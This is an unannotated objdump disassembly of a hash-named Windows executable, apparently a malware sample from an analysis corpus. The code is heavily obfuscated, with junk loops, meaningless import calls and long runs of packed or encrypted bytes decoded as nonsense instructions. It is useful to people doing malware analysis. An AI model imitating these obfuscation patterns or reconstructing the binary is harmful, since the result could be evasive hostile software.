
c0da56fc941f840aa30539cd0122f61dc56036d233d9b867f08eaaabd4cded01.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [ecx+0x7ed7fe56],ah
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [ecx],esp
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xc97db73a
  40126d:	es pusha 
  40126f:	daa    
  401270:	cwde   
  401271:	icebp  
  401272:	add    eax,0x669b60c2
  401277:	or     ebx,DWORD PTR [ebx+0x4a]
  40127a:	je     0x40124b
  40127c:	popa   
  40127d:	jle    0x401284
  40127f:	dec    eax
  401280:	je     0x4012d1
  401282:	loopne 0x4012ec
  401284:	je     0x401270
  401286:	jp     0x4012e5
  401288:	jmp    0x401300
  40128a:	sti    
  40128b:	push   cs
  40128c:	push   ecx
  40128d:	idiv   DWORD PTR [edi]
  40128f:	push   ds
  401290:	mov    cl,0xe3
  401292:	hlt    
  401293:	dec    edi
  401294:	pop    ss
  401295:	repnz sub ecx,ebp
  401298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401299:	and    edi,DWORD PTR [edi]
  40129b:	jle    0x4012cd
  40129d:	bound  ebp,QWORD PTR [ebx+0x5f]
  4012a0:	add    al,0x98
  4012a2:	imul   BYTE PTR [ecx-0x2884d541]
  4012a8:	mov    cl,0xb9
  4012aa:	mov    edx,0x5bf101b
  4012af:	push   eax
  4012b0:	cmp    eax,0x9812fb
  4012b5:	clc    
  4012b6:	jp     0x4012b7
  4012b8:	jne    0x40123c
  4012ba:	jae    0x4012a4
  4012bc:	xchg   ebx,eax
  4012bd:	mov    ebp,0xe833cd22
  4012c2:	sti    
  4012c3:	mov    al,0x9f
  4012c5:	inc    ecx
  4012c6:	imul   ebp,DWORD PTR [ebx],0xaf538deb
  4012cc:	mov    edi,0x8b7f9d28
  4012d1:	aad    0x7c
  4012d3:	cli    
  4012d4:	out    0x4d,al
  4012d6:	addr16 pusha 
  4012d8:	jmp    0x4012a5
  4012da:	pop    ebx
  4012db:	push   0x3c
  4012dd:	test   eax,0x5aab1821
  4012e2:	push   esi
  4012e3:	jmp    0x4012fe
  4012e5:	adc    eax,0xa98fedf7
  4012ea:	std    
  4012eb:	jle    0x4012a7
  4012ed:	sahf   
  4012ee:	xor    eax,0x84aece32
  4012f3:	in     al,dx
  4012f4:	xchg   edi,eax
  4012f5:	mov    ds:0x24f53a4d,eax
  4012fa:	fidivr DWORD PTR fs:[edx]
  4012fd:	cmc    
  4012fe:	je     0x401313
  401300:	mov    WORD PTR [ebx+0xba61e2e],es
  401306:	lods   al,BYTE PTR ds:[esi]
  401307:	shl    DWORD PTR [edx-0x14],0x4e
  40130b:	inc    esp
  40130c:	or     al,bl
  40130e:	xchg   esp,eax
  40130f:	neg    bl
  401311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401313:	jmp    0x3efb7c4
  401318:	fwait
  401319:	add    BYTE PTR [ebx-0x3d76e394],al
  40131f:	pop    ds
  401320:	inc    ecx
  401321:	ins    DWORD PTR es:[edi],dx
  401322:	out    dx,al
  401323:	out    dx,al
  401324:	push   ebp
  401325:	mov    ebx,0xd1c5bf57
  40132a:	adc    cl,BYTE PTR [eax+0x2c350b35]
  401330:	push   edx
  401331:	cmp    ecx,ecx
  401333:	mov    gs,edx
  401335:	inc    edx
  401336:	and    cl,BYTE PTR [esi]
  401338:	inc    esi
  401339:	add    eax,0x61d10645
  40133e:	mov    esi,0x3bd745cc
  401343:	dec    ecx
  401344:	fcmovu st,st(2)
  401346:	mov    cl,BYTE PTR [ecx+0x2581f445]
  40134c:	push   ebx
  40134d:	ss inc ebx
  40134f:	add    BYTE PTR [eax],al
  401351:	add    BYTE PTR [eax],al
  401353:	add    cl,ch
  401355:	or     eax,0x8b000000
  40135a:	sbb    eax,0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	out    dx,al
  4013b4:	mov    ss,WORD PTR [ecx]
  4013b6:	ret    
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x401363
  4013c0:	inc    ebx
  4013c1:	ins    BYTE PTR es:[edi],dx
  4013c2:	pushf  
  4013c3:	adc    eax,0x16373fd3
  4013c8:	les    ebp,FWORD PTR ds:0x8cd6a5c2
  4013ce:	sub    eax,0xfdaef93c
  4013d3:	cdq    
  4013d4:	jecxz  0x401423
  4013d6:	inc    ebx
  4013d7:	mov    dh,0x7c
  4013d9:	dec    esp
  4013da:	cmp    bh,al
  4013dc:	adc    edx,edi
  4013de:	lahf   
  4013df:	(bad)  
  4013e1:	(bad)  
  4013e2:	repz ds sbb ecx,esp
  4013e6:	mov    esi,DWORD PTR [ebp+0x53]
  4013e9:	xor    al,0xd4
  4013eb:	push   es
  4013ec:	stos   BYTE PTR es:[edi],al
  4013ed:	in     eax,0xb5
  4013ef:	mov    eax,ds:0xa9728ff1
  4013f4:	xor    DWORD PTR [edi+0x1c],ecx
  4013f7:	mov    ds,WORD PTR [ecx+0x7c]
  4013fa:	je     0x40138e
  4013fc:	adc    DWORD PTR [ecx-0x50],ebp
  4013ff:	shl    BYTE PTR [eax+0x7b],cl
  401402:	(bad)  
  401403:	in     al,0xbb
  401405:	mov    ecx,0x1dc4557f
  40140a:	dec    edx
  40140b:	mov    ah,0x95
  40140d:	dec    ecx
  40140e:	or     al,0x2f
  401410:	fstp   TBYTE PTR [ecx]
  401412:	push   ebp
  401413:	cmp    ch,dh
  401415:	dec    ebx
  401416:	push   cs
  401417:	xor    al,0xea
  401419:	jg     0x401430
  40141b:	xor    DWORD PTR [ecx-0x67],esp
  40141e:	and    DWORD PTR [ebx],esp
  401420:	dec    esi
  401421:	inc    edi
  401422:	push   esi
  401423:	(bad)  
  401424:	out    0x17,eax
  401426:	ja     0x401467
  401428:	and    DWORD PTR [eax],eax
  40142a:	cdq    
  40142b:	nop
  40142c:	ror    DWORD PTR [esi],1
  40142e:	xor    al,BYTE PTR [eax]
  401430:	in     al,dx
  401431:	dec    edi
  401432:	lods   eax,DWORD PTR ds:[esi]
  401433:	xchg   esi,eax
  401434:	cwde   
  401435:	lds    ebx,FWORD PTR [ebp-0x9]
  401438:	lods   al,BYTE PTR ds:[esi]
  401439:	sbb    BYTE PTR [ebx-0x8],0xbd
  40143d:	lock mov esi,0x56291a3f
  401443:	daa    
  401444:	mov    cs,WORD PTR [eax-0x58eaa542]
  40144a:	enter  0x69f9,0x3
  40144e:	xor    ecx,DWORD PTR [edx-0x16b10fbd]
  401454:	or     cl,BYTE PTR [eax]
  401456:	cmp    ah,ah
  401458:	push   esp
  401459:	sbb    eax,0xf563ce2b
  40145e:	and    BYTE PTR ds:0xf5525eb9,dl
  401464:	in     al,dx
  401465:	pushf  
  401466:	(bad)  
  401467:	cmp    eax,0x41f0080e
  40146c:	lods   al,BYTE PTR ds:[esi]
  40146d:	mov    edx,0xa24b6a51
  401472:	inc    edx
  401473:	std    
  401474:	jg     0x401452
  401476:	dec    ebp
  401477:	push   ss
  401478:	fistp  QWORD PTR [edx+0xae8963f]
  40147e:	push   0xa094092
  401483:	or     BYTE PTR [ebx+eax*1-0x5050f18f],ch
  40148a:	adc    DWORD PTR [esi],ebx
  40148c:	cmp    DWORD PTR [edi],0x6d
  40148f:	jb     0x40145b
  401491:	mov    bh,0x5f
  401493:	mov    ebp,DWORD PTR [esi+edi*2+0x52]
  401497:	cdq    
  401498:	sbb    BYTE PTR [eax],bl
  40149a:	mov    eax,0x187f24d8
  40149f:	jne    0x401452
  4014a1:	(bad)  
  4014a2:	jle    0x4014d3
  4014a4:	pop    edx
  4014a5:	leave  
  4014a6:	fld    QWORD PTR [edi+0x317a423a]
  4014ac:	(bad)  [eax+esi*2+0x7d]
  4014b0:	xor    edx,DWORD PTR [edx]
  4014b2:	out    0xd8,eax
  4014b4:	sbb    al,0xd4
  4014b6:	xor    DWORD PTR [edi+0x3a8e8f2b],esi
  4014bc:	xor    al,0xb9
  4014be:	in     al,dx
  4014bf:	aad    0x63
  4014c1:	pop    ebx
  4014c2:	or     cl,cl
  4014c4:	jae    0x4014e7
  4014c6:	aas    
  4014c7:	cmp    cl,BYTE PTR [ecx*1-0x4a967c87]
  4014ce:	test   al,0x62
  4014d0:	adc    ebx,DWORD PTR ds:0x6549f14d
  4014d6:	cmp    al,0x63
  4014d8:	imul   ebx,DWORD PTR [edx+0x5ea117ae],0xc1c802e9
  4014e2:	gs mov ecx,0xeb55060c
  4014e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014e9:	scas   al,BYTE PTR es:[edi]
  4014ea:	aad    0x6d
  4014ec:	dec    eax
  4014ed:	add    eax,0x45946ef2
  4014f2:	call   0x63df:0x8e5013f0
  4014f9:	lods   al,BYTE PTR ds:[esi]
  4014fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014fb:	das    
  4014fc:	pop    ecx
  4014fd:	call   0x2173:0xba720f79
  401504:	mov    eax,ds:0x49e408a9
  401509:	cmp    bl,0xb9
  40150c:	mov    dh,0x4b
  40150e:	adc    eax,0x8037592b
  401513:	and    dh,BYTE PTR ds:[edx+0x4e]
  401517:	shl    DWORD PTR [edi+0x22],cl
  40151a:	dec    esp
  40151b:	mov    edi,0xd583d9da
  401520:	ficom  WORD PTR [edi]
  401522:	and    DWORD PTR [edi-0x31c2d186],eax
  401528:	sbb    BYTE PTR [edx],bl
  40152a:	dec    BYTE PTR [ecx-0xc]
  40152d:	int3   
  40152e:	mov    cl,0x4c
  401530:	popa   
  401531:	das    
  401532:	dec    ecx
  401533:	jno    0x4014df
  401535:	cli    
  401536:	ret    0xa6d2
  401539:	sbb    eax,0xc2cd32af
  40153e:	adc    DWORD PTR [eax+0x5b],eax
  401541:	or     BYTE PTR [edx-0x75],dl
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43360f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x2db0971d]
  401564:	(bad)  
  401565:	push   es
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015ce
  40156e:	loopne 0x4015e9
  401570:	push   edi
  401571:	or     al,0xc5
  401573:	mov    al,0x24
  401575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401576:	data16 sbb BYTE PTR [ebp-0x3c722b88],cl
  40157d:	(bad)  
  40157f:	mov    al,0x8f
  401581:	sbb    cl,BYTE PTR [eax-0x58]
  401584:	dec    esp
  401585:	jmp    0x40154b
  401587:	add    esi,DWORD PTR [eax-0x4]
  40158a:	add    DWORD PTR [ecx*4+0x5d441f16],esi
  401591:	addr16 pop ecx
  401593:	sahf   
  401594:	test   al,0x26
  401596:	stc    
  401597:	scas   al,BYTE PTR es:[edi]
  401598:	mov    bh,0xdd
  40159a:	out    dx,al
  40159b:	or     DWORD PTR [ecx-0x53],edi
  40159e:	pop    ebx
  40159f:	lods   al,BYTE PTR ds:[esi]
  4015a0:	mov    ds:0x2183b620,al
  4015a5:	push   esi
  4015a6:	lods   eax,DWORD PTR ds:[esi]
  4015a7:	push   edi
  4015a8:	(bad)  
  4015a9:	repz out 0x8c,al
  4015ac:	out    0x38,al
  4015ae:	jecxz  0x40162c
  4015b0:	rcr    BYTE PTR [ecx+0x1cda0044],1
  4015b6:	xor    DWORD PTR [eax],edx
  4015b8:	lahf   
  4015b9:	adc    DWORD PTR [eax+0x204a9f29],0xc6e6a64
  4015c3:	push   ss
  4015c4:	mov    bl,0x91
  4015c6:	aad    0x7
  4015c8:	add    dh,BYTE PTR [edx-0x515d118a]
  4015ce:	scas   eax,DWORD PTR es:[edi]
  4015cf:	push   ebp
  4015d0:	int    0x7c
  4015d2:	stos   DWORD PTR es:[edi],eax
  4015d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d4:	popa   
  4015d5:	shl    BYTE PTR [ebp-0x60],0x4f
  4015d9:	les    ebx,FWORD PTR [ecx+0x20c3c2a6]
  4015df:	cdq    
  4015e0:	aad    0x41
  4015e2:	cmp    ebp,DWORD PTR ds:0x48726f89
  4015e8:	out    dx,al
  4015e9:	jg     0x4015e6
  4015eb:	(bad)  
  4015ec:	call   0xe88cbe8d
  4015f1:	stc    
  4015f2:	mov    al,0x86
  4015f4:	cmp    dh,dl
  4015f6:	push   cs
  4015f7:	bound  edx,QWORD PTR [esi+eax*2]
  4015fa:	into   
  4015fb:	mov    BYTE PTR [edi+0x78],ah
  4015fe:	inc    ebp
  4015ff:	jae    0x401614
  401601:	sbb    ebx,eax
  401603:	dec    edx
  401604:	or     al,0xa1
  401606:	push   ds
  401607:	push   es
  401608:	mov    bh,BYTE PTR [esp+esi*1]
  40160b:	mov    esp,0x7dc1a2ff
  401610:	sbb    BYTE PTR [ebx-0x458b4811],0x66
  401617:	or     bh,ch
  401619:	adc    al,0x51
  40161b:	cmp    DWORD PTR [ebx+0x557376cb],esi
  401621:	call   0x7f63:0x8bfac452
  401628:	dec    esp
  401629:	jg     0x401605
  40162b:	mov    ecx,0xdbbb6841
  401630:	(bad)  
  401631:	loope  0x4015b3
  401633:	call   0xe6d8:0xc5c1024e
  40163a:	adc    eax,0xe93f00a
  40163f:	popa   
  401640:	push   edx
  401641:	add    DWORD PTR [ebp+eiz*8+0x6095f30f],0x78
  401649:	mov    ch,0x4f
  40164b:	xchg   ecx,eax
  40164c:	xor    BYTE PTR [ebp+0x194ecbd1],al
  401652:	mov    edx,fs
  401654:	sbb    BYTE PTR [esi],bl
  401656:	or     DWORD PTR [esi+edx*4+0x29],ecx
  40165a:	lods   al,BYTE PTR ds:[esi]
  40165b:	loop   0x4016ac
  40165d:	jae    0x401664
  40165f:	cs inc edi
  401661:	mov    esi,0xea6f155
  401666:	stc    
  401667:	jle    0x4016e1
  401669:	mov    ch,0x2a
  40166b:	jge    0x401652
  40166d:	adc    al,0x70
  40166f:	pop    esi
  401670:	stc    
  401671:	fidivr WORD PTR [edi]
  401673:	push   ds
  401674:	and    esp,DWORD PTR [ebx-0x1af7dbd]
  40167a:	jmp    0x40166a
  40167c:	inc    ebp
  40167d:	fs xor al,0x74
  401680:	jmp    0x401640
  401682:	stc    
  401683:	sbb    al,0xf1
  401685:	hlt    
  401686:	or     DWORD PTR [ecx],ebx
  401688:	sti    
  401689:	int3   
  40168a:	push   ebx
  40168b:	mov    ch,0xaf
  40168d:	fsubr  QWORD PTR [eax]
  40168f:	repz mov dh,0xe5
  401692:	adc    ebx,DWORD PTR [ebx+0x73]
  401695:	push   ecx
  401696:	jge    0x40168d
  401698:	push   edx
  401699:	push   ebp
  40169a:	push   ds
  40169b:	pop    ecx
  40169c:	dec    edi
  40169d:	call   0xb7ca:0x77eabd63
  4016a4:	outs   dx,DWORD PTR ds:[esi]
  4016a5:	mov    esi,0x3ba6142d
  4016aa:	pop    ebx
  4016ab:	xchg   esp,eax
  4016ac:	call   0x28a2:0x7143a52c
  4016b3:	cmp    BYTE PTR [eax-0x5d53f61a],dl
  4016b9:	push   esi
  4016ba:	(bad)  
  4016bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016bc:	cmp    ch,bl
  4016be:	xor    dl,dl
  4016c0:	jmp    0xc98eda36
  4016c5:	retf   
  4016c6:	xor    al,0x3f
  4016c8:	stos   DWORD PTR es:[edi],eax
  4016c9:	ins    DWORD PTR es:[edi],dx
  4016ca:	and    ebp,DWORD PTR [ecx+0x627d5f70]
  4016d0:	cdq    
  4016d1:	mov    dh,dl
  4016d3:	ficomp DWORD PTR ds:0xcd07421
  4016d9:	int    0x25
  4016db:	cwde   
  4016dc:	aaa    
  4016dd:	out    dx,eax
  4016de:	cmp    ch,bh
  4016e0:	xchg   DWORD PTR [edx+0x7e],esp
  4016e3:	or     ecx,edx
  4016e5:	pushf  
  4016e6:	test   eax,0xcf76da1f
  4016eb:	outs   dx,DWORD PTR ds:[esi]
  4016ec:	(bad)  
  4016ed:	mov    ch,bl
  4016ef:	retf   
  4016f0:	aaa    
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x5056ade
  4018e9:	dec    ebx
  4018ea:	mov    WORD PTR [edx-0x5818186],es
  4018f0:	jg     0x401970
  4018f2:	jle    0x40195f
  4018f4:	add    dl,BYTE PTR [edx+0x38]
  4018f7:	mov    bh,0xf1
  4018f9:	je     0x4018bf
  4018fb:	and    al,0x13
  4018fd:	fsub   QWORD PTR [esi-0x7bcca3a3]
  401903:	ja     0x401904
  401905:	and    DWORD PTR [ebp+0x576f6c76],0x41c31050
  40190f:	jnp    0x401965
  401911:	outs   dx,BYTE PTR ds:[esi]
  401912:	pop    edi
  401913:	pop    ss
  401914:	push   ebp
  401915:	inc    ecx
  401916:	jae    0x401917
  401918:	ins    DWORD PTR es:[edi],dx
  401919:	xchg   ecx,eax
  40191a:	sub    al,0xa3
  40191c:	pushf  
  40191d:	or     eax,0xa5565347
  401922:	jnp    0x401900
  401924:	in     al,0x5f
  401926:	lods   eax,DWORD PTR ds:[esi]
  401927:	jmp    0x401954
  401929:	lock cwde 
  40192b:	popf   
  40192c:	inc    ebx
  40192d:	mov    DWORD PTR [esp+ecx*4],edi
  401930:	jge    0x4018e2
  401932:	mov    edx,esi
  401934:	test   al,0x8f
  401936:	lds    ebx,FWORD PTR [ecx+0x69]
  401939:	and    eax,esp
  40193b:	mov    dl,0x63
  40193d:	popa   
  40193e:	mov    esp,0xa9542e5b
  401943:	ins    BYTE PTR es:[edi],dx
  401944:	jmp    0x56ea2c50
  401949:	and    BYTE PTR [esi+0x37],bh
  40194c:	mov    al,ds:0xf2869455
  401951:	sub    al,0xa6
  401953:	xchg   esp,eax
  401954:	add    BYTE PTR [eax+0x55],ah
  401957:	(bad)  
  401958:	sub    DWORD PTR [esi],ebp
  40195a:	add    ebp,esi
  40195c:	fdivr  st(0),st
  40195e:	inc    esi
  40195f:	(bad)  
  401960:	inc    esi
